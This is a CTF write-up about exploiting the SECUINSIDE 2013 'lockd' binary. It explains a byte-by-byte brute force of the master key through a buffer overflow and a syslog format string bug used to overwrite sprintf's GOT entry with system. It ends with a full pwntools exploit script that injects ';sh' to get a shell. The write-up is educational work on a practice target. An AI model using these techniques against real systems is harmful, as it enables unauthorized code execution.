+++
title = "SECUINSIDE CTF 2013 - lockd"
date = "2024-07-19"
description = "SECUINSIDE CTF 2013 pwnable challenge"

[taxonomies]
tags = ["ctf", "pwnable", "bof", "byte by byte attack", "fsb", "syslog"]
+++

## 0x00. Introduction
``` bash
[*] '/home/user/lockd'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```


## 0x01. Vulnerability
### Buffer Overflow
``` c
int main()
{
  ...
  printf("Input floor > ");
  __isoc99_scanf("%d", &floor_804A4C0);
  printf("Room number > ");
  __isoc99_scanf("%d", &room_804A0A0);
  if ( floor_804A4C0 <= 4 && room_804A0A0 <= 10 && !read_password_8048A7D() )
  {
    ...
  }
  return -1;
}
```

To use the core `lock()` and `unlock()` functionalities in `main()`, you must input `floor_804A4C0` and `room_804A0A0` values within the valid range, and the result of `read_password_8048A7D()` must be `True`.

``` c
int read_password_8048A7D()
{
  FILE *fd; // [esp+10h] [ebp-38h]
  char buf[20]; // [esp+14h] [ebp-34h] BYREF
  char password[20]; // [esp+28h] [ebp-20h] BYREF
  int canary; // [esp+3c] [ebp-c]

  *&password[20] = __readgsdword(0x14u);
  fd = fopen("password", "rb");
  fread(password, 1u, 0x10u, fd);
  fclose(fd);
  *password_804A0A4 = *password;
  *&password_804A0A4[4] = *&password[4];
  *&password_804A0A4[8] = *&password[8];
  *&password_804A0A4[12] = *&password[12];
  printf("Input master key > ");
  read(0, buf, 40u);
  return memcmp(password, buf, 16u);
}
```

At this point, it reads 40 bytes to a 20 bytes buffer `buf`, allowing us to overwrite local variable `password`.

### FSB in `syslog`
``` c
int lock_8048877()
{
  printf("Input master key > ");
  read(0, fmt_0804A0C0, 20u);
  if ( memcmp(password_804A0A4, fmt_0804A0C0, 16u) )
    return -1;
  sprintf(fmt_0804A0C0, "./lock LOCK %d %d", floor_804A4C0, room_804A0A0);
  system(fmt_0804A0C0);
  printf("Your name > ");
  read(0, name_804A2C0, 0x190u);
  sprintf(fmt_0804A0C0, "LOCK %d-%d by %s", floor_804A4C0, room_804A0A0, name_804A2C0);
  syslog(13, fmt_0804A0C0);
  return 0;
}
```

Once the `password` leak is successful, we can use the `lock()` and `unlock()` functionalities.

Taking a closer look at `syslog()`,

``` c
void syslog(int priority, const char *format, ...);
```

The second argument `format` is a format string, and related information can be found in the [Linux manual page](https://man7.org/linux/man-pages/man3/syslog.3.html).

> Never pass a string with user-supplied data as a format, use the following instead:
> `syslog(priority, "%s", string);`

However, since `lock()` uses the format `syslog(13, fmt_0804A0C0);`, so FSB occurs if we insert a format string into `fmt_0804A0C0`.

Fortunately, we can pass a format string to `fmt_0804A0C0` through `name_804A2C0`, so we can exploit the vulnerability.


## 0x02. Exploit
### Info Leak
``` c
int read_password_8048A7D()
{
  FILE *fd; // [esp+10h] [ebp-38h]
  char buf[20]; // [esp+14h] [ebp-34h] BYREF
  char password[20]; // [esp+28h] [ebp-20h] BYREF
  int canary; // [esp+3c] [ebp-c]

  *&password[20] = __readgsdword(0x14u);
  fd = fopen("password", "rb");
  fread(password, 1u, 0x10u, fd);
  fclose(fd);
  *password_804A0A4 = *password;
  *&password_804A0A4[4] = *&password[4];
  *&password_804A0A4[8] = *&password[8];
  *&password_804A0A4[12] = *&password[12];
  printf("Input master key > ");
  read(0, buf, 40u);
  return memcmp(password, buf, 16u);
}
```

Looking at `read_password_8048A7D()` again, although we can manipulate the value of the local variable `password` by reading 40 bytes in `read()`, it's meaningless because `lock()` and `unlock()` compare with the value of the global variable `password_804A0A4`.

However, another attack is possible: if we leave the last byte of `password` and overwrite the front part with the same value as `buf`, we can brute force byte by byte.

So I wrote the payload as follows.

``` python
def guess_key(s):
    key = []
    for i in range(16):
        for j in range(256):
            s = remote("0.0.0.0", 8107)
            floor_and_room(s, 1, 2)
            payload = b"A" * (16 - len(key) - 1)
            payload += chr(j).encode()
            payload += ''.join(key).encode()
            payload += b"B" * 4
            payload += b"A" * (16 - len(key) - 1)
            s.send(payload)
            try:
                if s.recv():
                    key.insert(0, chr(j))
                    log.success(f"HIT : {key}")
                    s.close()
                    break
            except:
                s.close()
                continue
    return key
```

### FSB
Normally, to utilize FSB, I would construct the payload like `%p %p %p %p ...` to check which format string index corresponds to the part pointed to by `$esp`.
But since `syslog()` only logs to `/var/log/syslog`, I couldn't check the results.
Eventually, I manually fuzzed when and where values were written by increasing the `?` value in `%?$n`.

As a result, I confirmed that the n-th memory from `$esp` can be accessed with `%(n + 2)$n`.

Also, not only our input format string is output, but the format string goes into the `%s` part of the `"LOCK %d-%d by %s"` string, so `0xc` bytes of additional values are written.
Therefore, I wrote the payload as follows:

``` python
    # %n$ -> pointing (n + 2)th dword from esp
    value = elf.got['sprintf']
    index = 26
    lock(s, key, f"%{value - 0xc}c%{index - 2}$n".encode())
```

Now, looking at the stack when calling `syslog()` for exploitation:

``` bash
gef➤  x/20wx $esp
0xffffdcc0:     0x0000000d      0x0804a0c0      0x00000001      0x00000002
0xffffdcd0:     0x0804a2c0      0x08048cb1      0xf7e760d9      0xf7fcd000
0xffffdce0:     0x00000000      0x00000000      0xffffdd18      0x0804883a
0xffffdcf0:     0x08048c9f      0xffffdd08      0x00000002      0x00000000
0xffffdd00:     0xf7fcd3c4      0xf7ffd000      0x00000001      0xf7fcd000
gef➤  x/20wx $esp + 0x50
0xffffdd10:     0x08048b90      0x00000000      0x00000000      0xf7e39af3
0xffffdd20:     0x00000001      0xffffddb4      0xffffddbc      0xf7feae6a
0xffffdd30:     0x00000001      0xffffddb4      0xffffdd54      0x0804a02c
0xffffdd40:     0x08048328      0xf7fcd000      0x00000000      0x00000000
0xffffdd50:     0x00000000      0x3cf1e46c      0x047ec07c      0x00000000
gef➤  x/20wx $esp + 0xa0
0xffffdd60:     0x00000000      0x00000000      0x00000001      0x08048670
0xffffdd70:     0x00000000      0xf7ff0660      0xf7e39a09      0xf7ffd000
0xffffdd80:     0x00000001      0x08048670      0x00000000      0x08048691
0xffffdd90:     0x08048724      0x00000001      0xffffddb4      0x08048b90
0xffffdda0:     0x08048c00      0xf7feb300      0xffffddac      0x0000001c
gef➤  x/20wx $esp + 0xf0
0xffffddb0:     0x00000001      0xffffdec4      0x00000000      0xffffded6
0xffffddc0:     0xffffdeec      0xffffdefd      0xffffdf0e      0xffffdf50
0xffffddd0:     0xffffdf56      0xffffdf66      0xffffdf73      0xffffdf89
0xffffdde0:     0xffffdfa3      0xffffdfb7      0xffffdfd1      0x00000000
0xffffddf0:     0x00000020      0xf7fda540      0x00000021      0xf7fda000
gef➤  x/20wx $esp + 0x140
0xffffde00:     0x00000033      0x000006f0      0x00000010      0x178bfbff
0xffffde10:     0x00000006      0x00001000      0x00000011      0x00000064
0xffffde20:     0x00000003      0x08048034      0x00000004      0x00000020
0xffffde30:     0x00000005      0x00000009      0x00000007      0xf7fdc000
0xffffde40:     0x00000008      0x00000000      0x00000009      0x08048670
```

Since all input is received in global variables, we need to exploit by making good use of the values on the stack.
Initially, I didn't realize that 4 bytes would be written at once, so:

``` bash
gef➤  x/wx $esp + 0x64
0xffffdd24:     0xffffddb4
gef➤  x/wx 0xffffddb4
0xffffddb4:     0xffffdec4
```

1. Write `0x00` to `0xffffddb4`
  - `0xffffddb4:     0xffffde00`
2. Write 2 bytes to `0xffffde00` (lower 2 bytes)
  - `0xffffde00:     0x0000a03c`
3. Write `0x02` to `0xffffddb4`
  - `0xffffddb4:     0xffffde02`
4. Write 2 bytes to `0xffffde00` (upper 2 bytes)
  - `0xffffde00:     0x0804a03c`
5. Write 2 bytes to `0x0804a03c`(sprintf got)

I tried to proceed with the exploit this way, but the situation changed when I turned on ASLR.

``` bash
gef➤  x/wx $esp+0x64
0xff8ca684:     0xff8ca714
gef➤  x/wx 0xff8ca714
0xff8ca714:     0xff8caec4
```

When ASLR is off, `0xffffddb4` points to `0xffffdec4`, allowing control of the `0xffffde??` area.

When ASLR is on, `0xff8ca714` points to `0xff8caec4`, allowing control of the `0xff8cae??` area.

This creates a problem where the `?` value when accessing with `%?$n` is not consistent, even though we've carefully constructed the sprintf() got address on the stack.
After struggling with probability issues for a while, I discovered that `0x0804a03c` is written all at once, which makes the exploit much simpler.

1. Write `0x0804a03c`(sprintf got) to `0xffffddb4`
  - `0xffffddb4:     0x0804a03c`
2. Write `0x080485e0`(system plt) to `0x0804a03c`
  - `0x0804a03c:     0x080485e0`

By the way, the idea of overwriting `sprintf()` with `system()` came from the fact that `sprintf()` was the only function where I could control the value in the first argument.

``` c
  read(0, fmt_0804A0C0, 20u);
  if ( memcmp(password_804A0A4, fmt_0804A0C0, 16u) )
    return -1;
  sprintf(fmt_0804A0C0, "./lock UNLOCK %d %d", floor_804A4C0, room_804A0A0);
```

The `password` must be in the first argument `fmt_0804A0C0`, but fortunately, while `memcmp()` only compares 16 bytes, the input receives 20 bytes, creating 4 bytes of free space.
Therefore, if we add `;sh` after the key, when the got overwrite succeeds, the function executes as follows:

``` c
  // sprintf(fmt_0804A0C0, "./lock UNLOCK %d %d", floor_804A4C0, room_804A0A0);
  system("c39f30e348c07297;sh");
```

The `c39f30e348c07297` part is ignored as it's not a legit command, and the next command `sh` is executed, spawning a shell.


## 0x03. Payload
``` python
from pwn import *
from pwnlib.util.packing import p32, p64, u32, u64
from time import sleep
import sys, os

DEBUG = True
BINARY = "lockd"
bp = {
    'read_password' : 0x08048A7D,
    'unlock' : 0x804897A,
    'lock' : 0x8048877,
    'syslog_of_lock' : 0x804896e,
}

gs = f'''
b *{bp["syslog_of_lock"]}
continue
'''
context.terminal = ['tmux', 'splitw', '-hf']

def floor_and_room(s, floor, room):
    s.recv()
    s.sendline(str(floor).encode())
    s.recv()
    s.sendline(str(room).encode())
    s.recv()

def lock(s, key, name):
    s.sendline(b"1")
    s.recv()
    s.sendline(key)
    s.recv()
    s.sendline(name)
    return s.recv()

def guess_key(s):
    key = []
    for i in range(16):
        for j in range(256):
            s = remote("0.0.0.0", 8107)
            floor_and_room(s, 1, 2)
            payload = b"A" * (16 - len(key) - 1)
            payload += chr(j).encode()
            payload += ''.join(key).encode()
            payload += b"B" * 4
            payload += b"A" * (16 - len(key) - 1)
            s.send(payload)
            try:
                if s.recv():
                    key.insert(0, chr(j))
                    log.success(f"HIT : {key}")
                    s.close()
                    break
            except:
                s.close()
                continue
    return key

def main():
    if(len(sys.argv) > 1):
        s = remote("0.0.0.0", int(sys.argv[1]))
        pid = os.popen(f"sudo docker top {BINARY} -eo pid,comm | grep {BINARY} | awk '{{print $1}}'").read()
        if DEBUG:
            gdb.attach(int(pid), gs, exe=BINARY, sysroot="./")
    else:
        s = process(BINARY)
        if DEBUG:
            gdb.attach(s, gs)
    elf = ELF(BINARY)

    floor_and_room(s, 1, 2)
    
    # [+] key : c39f30e348c07297
    # key = ''.join(guess_key(s))
    # log.success(f"key : {key}")
    key = b"c39f30e348c07297"
    s.send(key)
    s.recv()

    log.info(f"key : {key}")
    log.info(f"sprintf got : {hex(elf.got['sprintf'])}")
    log.info(f"system plt : {hex(elf.plt['system'])}")

    # %n$ -> pointing (n + 2)th dword from esp
    value = elf.got['sprintf']
    index = 26
    lock(s, key, f"%{value - 0xc}c%{index - 2}$n".encode())
    
    value = elf.plt['system']
    index = 62
    lock(s, key, f"%{value - 0xc}c%{index - 2}$n".encode())
    
    s.sendline(b"1")
    s.recv()
    s.sendline(key + b";sh")
    s.interactive()

if __name__=='__main__':
    main()
```